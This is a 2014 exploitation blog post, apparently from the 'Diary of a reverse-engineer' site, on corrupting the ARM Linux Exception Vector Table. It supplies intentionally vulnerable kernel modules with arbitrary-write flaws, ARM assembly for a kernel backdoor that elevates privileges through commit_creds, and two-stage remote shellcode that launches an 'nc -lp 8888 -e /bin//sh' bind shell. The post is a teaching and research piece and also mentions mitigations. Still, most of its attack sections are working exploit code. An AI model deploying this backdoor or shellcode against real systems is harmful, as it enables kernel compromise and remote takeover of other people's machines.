@@ -1,0 +1,544 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Corrupting the ARM Exception Vector Table - Diary of a reverse-engineer</title>
+  <meta name="author" content="Axel Souchet, Jonathan Salwan, Jérémy Fetiveau">
+
+  
+  <meta name="description" content="Introduction A few months ago, I was writing a Linux kernel exploitation challenge on ARM in an attempt to learn about kernel exploitation and I &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://doar-e.github.io/blog/2014/04/30/corrupting-arm-evt">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Diary of a reverse-engineer" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href='http://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'>
+<link href='http://fonts.googleapis.com/css?family=Fjalla+One' rel='stylesheet' type='text/css'>
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-43481215-1']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+
+  <style>
+    p { text-align: justify; }
+  </style>
+
+</head>
+<body   class="collapse-sidebar sidebar-footer" >
+  <header role="banner"><img src="/images/sigle-blanc-250px.jpg"></img>
+
+	<div class="header-title"><a href="/">Diary of a reverse-engineer</a></div>
+
+
+	<br><div class="header-subtitle">Because we like to play with weird things.</div>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:doar-e.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+  <li><a href="/about">About</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+  
+    
+      <h1 class="entry-title">Corrupting the ARM Exception Vector Table</h1>
+    
+  
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-04-30T21:01:00+01:00" pubdate data-updated="true">Apr 30<span>th</span>, 2014</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><h1>Introduction</h1>
+
+<p>A few months ago, I was writing a Linux kernel exploitation challenge on ARM in an attempt to learn about kernel exploitation and I thought I&rsquo;d explore things a little. I chose the ARM architecture mainly because I thought it would be fun to look at. This article is going to describe how the ARM Exception Vector Table (EVT) can aid in kernel exploitation in case an attacker has a write what-where primitive. It will be covering a local exploit scenario as well as a remote exploit scenario. Please note that corrupting the EVT has been mentioned in the paper &ldquo;Vector Rewrite Attack&rdquo;[1], which briefly talks about how it can be used in NULL pointer dereference vulnerabilities on an ARM RTOS.</p>
+
+<p>The article is broken down into two main sections. First a brief description of the ARM EVT and its implications from an exploitation point of view (please note that a number of things about the EVT will be omitted to keep this article relatively short). We will go over two examples showing how we can abuse the EVT.</p>
+
+<p>I am assuming the reader is familiar with Linux kernel exploitation and knows some ARM assembly (seriously).</p>
+
+<!--more-->
+
+
+<h1>ARM Exceptions and the Exception Vector Table</h1>
+
+<p>In a few words, the EVT is to ARM what the IDT is to x86. In the ARM world, an exception is an event that causes the CPU to stop or pause from executing the current set of instructions. When this exception occurs, the CPU diverts execution to another location called an exception handler. There are 7 exception types and each exception type is associated with a mode of operation. Modes of operation affect the processor&rsquo;s &ldquo;permissions&rdquo; in regards to system resources. There are in total 7 modes of operation. The following table maps some exception types to their associated modes of operation:</p>
+
+<pre><code> Exception                   |       Mode            |     Description
+ ----------------------------|-----------------------|-------------------------------------------------------------------
+ Fast Interrupt Request      |      FIQ              |   interrupts requiring fast response and low latency.
+ Interrupt Request           |      IRQ              |   used for general-purpose interrupt handling.
+ Software Interrupt or RESET |      Supervisor Mode  |   protected mode for the operating system.
+ Prefetch or Data Abort      |      Abort Mode       |   when fetching data or an instruction from invalid/unmmaped memory.
+ Undefined Instruction       |      Undefined Mode   |   when an undefined instruction is executed.
+</code></pre>
+
+<p>The other two modes are User Mode which is self explanatory and System Mode which is a privileged user mode for the operating system</p>
+
+<h2>The Exceptions</h2>
+
+<p>The exceptions change the processor mode and each exception has access to a set of <em>banked</em> registers. These can be described as a set of registers that exist only in the exception&rsquo;s context so modifying them will not affect the banked registers of another exception mode. Different exception modes have different banked registers:<br/>
+<img src="/images/corrupting_arm_evt/banked_regs.png" alt="Banked Registers" /></p>
+
+<h2>The Exception Vector Table</h2>
+
+<p>The vector table is a table that actually contains control transfer instructions that jump to the respective exception handlers. For example, when a software interrupt is raised, execution is transfered to the software interrupt entry in the table which in turn will jump to the syscall handler. Why is the EVT so interesting to target? Well because it is loaded at a known address in memory and it is writeable* and executable. On 32-bit ARM Linux this address is <strong>0xffff0000</strong>. Each entry in the EVT is also at a known offset as can be seen on the following table:</p>
+
+<pre><code> Exception                   |       Address            
+ ----------------------------|-----------------------
+ Reset                       |      0xffff0000           
+ Undefined Instruction       |      0xffff0004       
+ SWI                         |      0xffff0008  
+ Prefetch Abort              |      0xffff000c       
+ Data Abort                  |      0xffff0010 
+ Reserved                    |      0xffff0014  
+ IRQ                         |      0xffff0018   
+ FIQ                         |      0xffff001c  
+</code></pre>
+
+<h3>A note about the Undefined Instruction exception</h3>
+
+<p>Overwriting the Undefiend Instruction vector seems like a great plan but it actually isn&rsquo;t because it is used by the kernel. <em>Hard float</em> and <em>Soft float</em> are two solutions that allow emulation of floating point instructions since a lot of ARM platforms do not have hardware floating point units. With soft float, the emulation code is added to the userspace application at compile time. With hard float, the kernel lets the userspace application use the floating point instructions as if the CPU supported them and then using the Undefined Instruction exception, it emulates the instruction inside the kernel.</p>
+
+<p>If you want to read more on the EVT, checkout the references at the bottom of this article, or google it.</p>
+
+<h1>Corrupting the EVT</h1>
+
+<p>There are few vectors we could use in order to obtain privileged code execution. Clearly, overwriting any vector in the table could potentially lead to code execution, but as the lazy people that we are, let&rsquo;s try to do the least amount of work. The easiest one to overwrite seems to be the Software Interrupt vector. It is executing in process context, system calls go through there, all is well. Let&rsquo;s now go through some PoCs/examples. All the following examples have been tested on Debian 7 ARMel 3.2.0-4-versatile running in qemu.</p>
+
+<h2>Local scenario</h2>
+
+<p>The example vulnerable module implements a char device that has a pretty blatant arbitrary-write vulnerability( or is it a feature?):</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">/</span> <span class="n">called</span> <span class="n">when</span> <span class="err">&#39;</span><span class="n">write</span><span class="err">&#39;</span> <span class="n">system</span> <span class="n">call</span> <span class="n">is</span> <span class="n">done</span> <span class="n">on</span> <span class="n">the</span> <span class="n">device</span> <span class="n">file</span>
+</span><span class='line'><span class="k">static</span> <span class="kt">ssize_t</span> <span class="n">on_write</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">filp</span><span class="p">,</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buff</span><span class="p">,</span><span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span><span class="n">loff_t</span> <span class="o">*</span><span class="n">off</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>    <span class="kt">size_t</span> <span class="n">siz</span> <span class="o">=</span> <span class="n">len</span><span class="p">;</span>
+</span><span class='line'>    <span class="kt">void</span> <span class="o">*</span> <span class="n">where</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span><span class='line'>    <span class="kt">char</span> <span class="o">*</span> <span class="n">what</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">siz</span> <span class="o">&gt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">where</span><span class="p">))</span>
+</span><span class='line'>        <span class="n">what</span> <span class="o">=</span> <span class="n">buff</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">where</span><span class="p">);</span>
+</span><span class='line'>    <span class="k">else</span>
+</span><span class='line'>        <span class="k">goto</span> <span class="n">end</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">copy_from_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">where</span><span class="p">,</span> <span class="n">buff</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">where</span><span class="p">));</span>
+</span><span class='line'>    <span class="n">memcpy</span><span class="p">(</span><span class="n">where</span><span class="p">,</span> <span class="n">what</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">));</span>
+</span><span class='line'>
+</span><span class='line'><span class="nl">end:</span>
+</span><span class='line'>    <span class="k">return</span> <span class="n">siz</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Basically, with this cool and realistic vulnerability, you give the module an address followed by data to write at that address.
+Now, our plan is going to be to backdoor the kernel by overwriting the SWI exception vector with code that jumps to our backdoor code. This code will check for a magic value in a register (say r7 which holds the syscall number) and if it matches, it will elevate the privileges of the calling process. Where do we store this backdoor code ? Considering the fact that we have an arbitrary write to kernel memory, we can either store it in userspace or somewhere in kernel space. The good thing about the latter choice is that if we choose an appropriate location in kernel space, our code will exist as long as the machine is running, whereas with the former choice, as soon as our user space application exits, the code is lost and if the entry in the EVT isn&rsquo;t set back to its original value, it will most likely be pointing to invalid/unmmapped memory which will crash the system. So we need a location in kernel space that is executable and writeable. Where could this be ? Let&rsquo;s take a closer look at the EVT:<br/>
+<img src="/images/corrupting_arm_evt/evt_8i.png" alt="EVT Disassembly" /><br/>
+As expected we see a bunch of control transfer instructions but one thing we notice about them is that &ldquo;closest&rdquo; referenced address is <em>0xffff0200</em>. Let&rsquo;s take a look what is between the end of the EVT and 0xffff0200:<br/>
+<img src="/images/corrupting_arm_evt/evt_400wx.png" alt="EVT Inspection" /><br/>
+It looks like nothing is there so we have around 480 bytes to store our backdoor which is more than enough.</p>
+
+<h3>The Exploit</h3>
+
+<p>Recapitulating our exploit:</p>
+
+<pre><code>1. Store our backdoor at *0xffff0020*.  
+2. Overwrite the SWI exception vector with a branch to *0xffff0020*.  
+3. When a system call occurs, our backdoor will check if r7 == 0xb0000000 and if true, elevate the privileges of the calling process otherwise jump to the normal system call handler.  
+</code></pre>
+
+<p>Here is the backdoor&rsquo;s code:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class='nasm'><span class='line'><span class="err">@</span> <span class="nf">check</span> <span class="nv">if</span> <span class="nv">magic</span>
+</span><span class='line'>    <span class="nf">cmp</span>     <span class="nv">r7</span><span class="p">,</span> <span class="err">#</span><span class="mh">0xb0000000</span>
+</span><span class='line'>    <span class="nf">bne</span>     <span class="nv">exit</span>
+</span><span class='line'>
+</span><span class='line'><span class="nl">elevate:</span>
+</span><span class='line'>    <span class="nf">stmfd</span>   <span class="nb">sp</span><span class="err">!</span><span class="p">,</span><span class="err">{</span><span class="nv">r0</span><span class="o">-</span><span class="nv">r12</span><span class="err">}</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="nf">mov</span>     <span class="nv">r0</span><span class="p">,</span> <span class="err">#</span><span class="mi">0</span>
+</span><span class='line'>    <span class="nf">ldr</span>     <span class="nv">r3</span><span class="p">,</span> <span class="err">=</span><span class="mh">0xc0049a00</span>     <span class="err">@</span> <span class="nv">prepare_kernel_cred</span>
+</span><span class='line'>    <span class="nf">blx</span>     <span class="nv">r3</span>
+</span><span class='line'>    <span class="nf">ldr</span>     <span class="nv">r4</span><span class="p">,</span> <span class="err">=</span><span class="mh">0xc0049438</span>     <span class="err">@</span> <span class="nv">commit_creds</span>
+</span><span class='line'>    <span class="nf">blx</span>     <span class="nv">r4</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="nf">ldmfd</span>   <span class="nb">sp</span><span class="err">!</span><span class="p">,</span> <span class="err">{</span><span class="nv">r0</span><span class="o">-</span><span class="nv">r12</span><span class="p">,</span> <span class="nv">pc</span><span class="err">}</span><span class="o">^</span>  <span class="err">@</span> <span class="nv">return</span> <span class="nv">to</span> <span class="nv">userland</span>
+</span><span class='line'>
+</span><span class='line'><span class="err">@</span> <span class="nf">go</span> <span class="nv">to</span> <span class="nv">syscall</span> <span class="nv">handler</span>
+</span><span class='line'><span class="nl">exit:</span>
+</span><span class='line'>    <span class="nf">ldr</span>     <span class="nv">pc</span><span class="p">,</span> <span class="p">[</span><span class="nv">pc</span><span class="p">,</span> <span class="err">#</span><span class="mi">980</span><span class="p">]</span>      <span class="err">@</span> <span class="nv">go</span> <span class="nv">to</span> <span class="nv">normal</span> <span class="nv">swi</span> <span class="nv">handler</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>You can find the complete code for the vulnerable module and the exploit <a href="https://github.com/acama/arm-evt/tree/master/local_example">here</a>. Run the exploit:<br/>
+<img src="/images/corrupting_arm_evt/local_poc.png" alt="Local PoC" /></p>
+
+<h2>Remote scenario</h2>
+
+<p>For this example, we will use a netfilter module with a similar vulnerability as the previous one:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">if</span><span class="p">(</span><span class="n">ip</span><span class="o">-&gt;</span><span class="n">protocol</span> <span class="o">==</span> <span class="n">IPPROTO_TCP</span><span class="p">){</span>
+</span><span class='line'>    <span class="n">tcp</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">tcphdr</span> <span class="o">*</span><span class="p">)(</span><span class="n">skb_network_header</span><span class="p">(</span><span class="n">skb</span><span class="p">)</span> <span class="o">+</span> <span class="n">ip_hdrlen</span><span class="p">(</span><span class="n">skb</span><span class="p">));</span>
+</span><span class='line'>    <span class="n">currport</span> <span class="o">=</span> <span class="n">ntohs</span><span class="p">(</span><span class="n">tcp</span><span class="o">-&gt;</span><span class="n">dest</span><span class="p">);</span>
+</span><span class='line'>    <span class="k">if</span><span class="p">((</span><span class="n">currport</span> <span class="o">==</span> <span class="mi">9999</span><span class="p">)){</span>
+</span><span class='line'>        <span class="n">tcp_data</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)((</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">tcp</span> <span class="o">+</span> <span class="p">(</span><span class="n">tcp</span><span class="o">-&gt;</span><span class="n">doff</span> <span class="o">*</span> <span class="mi">4</span><span class="p">));</span>
+</span><span class='line'>        <span class="n">where</span> <span class="o">=</span> <span class="p">((</span><span class="kt">void</span> <span class="o">**</span><span class="p">)</span><span class="n">tcp_data</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
+</span><span class='line'>        <span class="n">len</span> <span class="o">=</span> <span class="p">((</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">tcp_data</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">where</span><span class="p">)))[</span><span class="mi">0</span><span class="p">];</span>
+</span><span class='line'>        <span class="n">what</span> <span class="o">=</span> <span class="n">tcp_data</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">where</span><span class="p">)</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">len</span><span class="p">);</span>
+</span><span class='line'>        <span class="n">memcpy</span><span class="p">(</span><span class="n">where</span><span class="p">,</span> <span class="n">what</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Just like the previous example, this module has an awesome feature that allows you to write data to anywhere you want. Connect on port tcp/9999 and just give it an address, followed by the size of the data and the actual data to write there. In this case we will also backdoor the kernel by overwriting the SWI exception vector and backdooring the kernel. The code will branch to our shellcode which we will also, as in the previous example, store at <em>0xffff020</em>. Overwriting the SWI vector is especially a good idea in this remote scenario because it will allow us to switch from interrupt context to process context. So our backdoor will be executing in a context with a backing process and we will be able to &ldquo;hijack&rdquo; this process and overwrite its code segment with a bind shell or connect back shell. But let&rsquo;s not do it that way. Let&rsquo;s check something real quick:<br/>
+<img src="/images/corrupting_arm_evt/proc_self_maps.png" alt="cat /proc/self/maps" /><br/>
+Would you look at that, on top of everything else, the EVT is a shared memory segment. It is executable from user land and writeable from kernel land*. Instead of overwriting the code segment of a process that is making a system call, let&rsquo;s just store our code in the EVT right after our first stage and just return there.
+Every system call goes through the SWI vector so we won&rsquo;t have to wait too much for a process to get caught in our trap.</p>
+
+<h3>The Exploit</h3>
+
+<p>Our exploit goes:</p>
+
+<pre><code>1. Store our first stage and second stage shellcodes at *0xffff0020* (one after the other).  
+2. Overwrite the SWI exception vector with a branch to *0xffff0020*.  
+3. When a system call occurs, our first stage shellcode will set the link register to the address of our second stage shellcode (which is also stored in the EVT and which will be executed from userland), and then return to userland.  
+4. The calling process will "resume execution" at the address of our second stage which is just a bind shell.  
+</code></pre>
+
+<p>Here is the stage 1-2 shellcode:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+</pre></td><td class='code'><pre><code class='nasm'><span class='line'><span class="nl">stage_1:</span>
+</span><span class='line'>    <span class="nf">adr</span>     <span class="nv">lr</span><span class="p">,</span> <span class="nv">stage_2</span>
+</span><span class='line'>    <span class="nf">push</span>    <span class="err">{</span><span class="nv">lr</span><span class="err">}</span>
+</span><span class='line'>    <span class="nf">stmfd</span>   <span class="nb">sp</span><span class="err">!</span><span class="p">,</span> <span class="err">{</span><span class="nv">r0</span><span class="o">-</span><span class="nv">r12</span><span class="err">}</span>
+</span><span class='line'>    <span class="nf">ldr</span>     <span class="nv">r0</span><span class="p">,</span> <span class="err">=</span><span class="mh">0xe59ff410</span>     <span class="err">@</span> <span class="nv">intial</span> <span class="nv">value</span> <span class="nv">at</span> <span class="mh">0xffff0008</span> <span class="nv">which</span> <span class="nv">is</span>
+</span><span class='line'>                                <span class="err">@</span> <span class="nf">ldr</span>     <span class="nv">pc</span><span class="p">,</span> <span class="p">[</span><span class="nv">pc</span><span class="p">,</span> <span class="err">#</span><span class="mi">1040</span><span class="p">]</span> <span class="c1">; 0xffff0420</span>
+</span><span class='line'>    <span class="nf">ldr</span>     <span class="nv">r1</span><span class="p">,</span> <span class="err">=</span><span class="mh">0xffff0008</span>
+</span><span class='line'>    <span class="nf">str</span>     <span class="nv">r0</span><span class="p">,</span> <span class="p">[</span><span class="nv">r1</span><span class="p">]</span>
+</span><span class='line'>    <span class="nf">ldmfd</span>   <span class="nb">sp</span><span class="err">!</span><span class="p">,</span> <span class="err">{</span><span class="nv">r0</span><span class="o">-</span><span class="nv">r12</span><span class="p">,</span> <span class="nv">pc</span><span class="err">}</span><span class="o">^</span>  <span class="err">@</span> <span class="nv">return</span> <span class="nv">to</span> <span class="nv">userland</span>
+</span><span class='line'>
+</span><span class='line'><span class="nl">stage_2:</span>
+</span><span class='line'>    <span class="nf">ldr</span>     <span class="nv">r0</span><span class="p">,</span> <span class="err">=</span><span class="mh">0x6e69622f</span>     <span class="err">@</span> <span class="o">/</span><span class="nv">bin</span>
+</span><span class='line'>    <span class="nf">ldr</span>     <span class="nv">r1</span><span class="p">,</span> <span class="err">=</span><span class="mh">0x68732f2f</span>     <span class="err">@</span> <span class="o">/</span><span class="nv">sh</span>
+</span><span class='line'>    <span class="nf">eor</span>     <span class="nv">r2</span><span class="p">,</span> <span class="nv">r2</span><span class="p">,</span> <span class="nv">r2</span>          <span class="err">@</span> <span class="mh">0x00000000</span>
+</span><span class='line'>    <span class="nf">push</span>    <span class="err">{</span><span class="nv">r0</span><span class="p">,</span> <span class="nv">r1</span><span class="p">,</span> <span class="nv">r2</span><span class="err">}</span>
+</span><span class='line'>    <span class="nf">mov</span>     <span class="nv">r0</span><span class="p">,</span> <span class="nb">sp</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="nf">ldr</span>     <span class="nv">r4</span><span class="p">,</span> <span class="err">=</span><span class="mh">0x0000632d</span>     <span class="err">@</span> <span class="o">-</span><span class="nv">c</span><span class="err">\</span><span class="nv">x00</span><span class="err">\</span><span class="nv">x00</span>
+</span><span class='line'>    <span class="nf">push</span>    <span class="err">{</span><span class="nv">r4</span><span class="err">}</span>
+</span><span class='line'>    <span class="nf">mov</span>     <span class="nv">r4</span><span class="p">,</span> <span class="nb">sp</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="nf">ldr</span>     <span class="nv">r5</span><span class="p">,</span> <span class="err">=</span><span class="mh">0x2d20636e</span>
+</span><span class='line'>    <span class="nf">ldr</span>     <span class="nv">r6</span><span class="p">,</span> <span class="err">=</span><span class="mh">0x3820706c</span>
+</span><span class='line'>    <span class="nf">ldr</span>     <span class="nv">r7</span><span class="p">,</span> <span class="err">=</span><span class="mh">0x20383838</span>     <span class="err">@</span> <span class="nv">nc</span> <span class="o">-</span><span class="nv">lp</span> <span class="mi">8888</span> <span class="o">-</span><span class="nv">e</span> <span class="o">/</span><span class="nv">bin</span><span class="o">//</span><span class="nv">sh</span>
+</span><span class='line'>    <span class="nf">ldr</span>     <span class="nv">r8</span><span class="p">,</span> <span class="err">=</span><span class="mh">0x2f20652d</span>
+</span><span class='line'>    <span class="nf">ldr</span>     <span class="nv">r9</span><span class="p">,</span> <span class="err">=</span><span class="mh">0x2f6e6962</span>
+</span><span class='line'>    <span class="nf">ldr</span>     <span class="nv">r10</span><span class="p">,</span> <span class="err">=</span><span class="mh">0x68732f2f</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="nf">eor</span>     <span class="nv">r11</span><span class="p">,</span> <span class="nv">r11</span><span class="p">,</span> <span class="nv">r11</span>
+</span><span class='line'>    <span class="nf">push</span>    <span class="err">{</span><span class="nv">r5</span><span class="o">-</span><span class="nv">r11</span><span class="err">}</span>
+</span><span class='line'>    <span class="nf">mov</span>     <span class="nv">r5</span><span class="p">,</span> <span class="nb">sp</span>
+</span><span class='line'>    <span class="nf">push</span>    <span class="err">{</span><span class="nv">r2</span><span class="err">}</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="nf">eor</span>     <span class="nv">r6</span><span class="p">,</span> <span class="nv">r6</span><span class="p">,</span> <span class="nv">r6</span>
+</span><span class='line'>    <span class="nf">push</span>    <span class="err">{</span><span class="nv">r0</span><span class="p">,</span><span class="nv">r4</span><span class="p">,</span><span class="nv">r5</span><span class="p">,</span> <span class="nv">r6</span><span class="err">}</span>
+</span><span class='line'>    <span class="nf">mov</span>     <span class="nv">r1</span><span class="p">,</span> <span class="nb">sp</span>
+</span><span class='line'>    <span class="nf">mov</span>     <span class="nv">r7</span><span class="p">,</span> <span class="err">#</span><span class="mi">11</span>
+</span><span class='line'>    <span class="nf">swi</span>     <span class="mh">0x0</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="nf">mov</span>     <span class="nv">r0</span><span class="p">,</span> <span class="err">#</span><span class="mi">99</span>
+</span><span class='line'>    <span class="nf">mov</span>     <span class="nv">r7</span><span class="p">,</span> <span class="err">#</span><span class="mi">1</span>
+</span><span class='line'>    <span class="nf">swi</span>     <span class="mh">0x0</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>You can find the complete code for the vulnerable module and the exploit <a href="https://github.com/acama/arm-evt/tree/master/remote_example">here</a>. Run the exploit:<br/>
+<img src="/images/corrupting_arm_evt/remote_poc.png" alt="Remote PoC" /></p>
+
+<h2>Bonus: Interrupt Stack Overflow</h2>
+
+<p>It seems like the Interrupt Stack is adjacent to the EVT in most memory layouts. Who knows what kind of interesting things would happen if there was something like a stack overflow ?</p>
+
+<h1>A Few Things about all this</h1>
+
+<ul>
+<li>The techniques discussed in this article make the assumption that the attack has knowledge of the kernel addresses which might not always be the case.</li>
+<li>The location where we are storing our shellcode (<em>0xffff0020</em>) might or might not be used by another distro&rsquo;s kernel.</li>
+<li>The exampe codes I wrote here are merely PoCs; they could definitely be improved. For example, on the remote scenario, if it turns out that the init process is the process being hijacked, the box will crash after we exit from the bind shell.</li>
+<li>If you hadn&rsquo;t noticed, the &ldquo;vulnerabilities&rdquo; presented here, aren&rsquo;t really vulnerabilities but that is not the point of this article.</li>
+<li>*: It seems like the EVT can be mapped read-only and therfore there is the possibility that it might not be writeable in newer/some versions of the Linux kernel.</li>
+</ul>
+
+
+<h1>Final words</h1>
+
+<p>Among other things, <a href="http:/grsecurity.net/">grsec</a> prevents the modification of the EVT by making the page read-only.
+If you want to play with some fun kernel challenges checkout the &ldquo;kernelpanic&rdquo; branch on <a href="http:/w3challs.com/challenges/wargame">w3challs</a>.<br/>
+Cheers, <a href="https://twitter.com/amatcama">@amatcama</a></p>
+
+<h1>References</h1>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Amat "acez" Cama</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-04-30T21:01:00+01:00" pubdate data-updated="true">Apr 30<span>th</span>, 2014</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/exploitation/'>exploitation</a>, <a class='category' href='/blog/categories/kernel/'>kernel</a>
+  
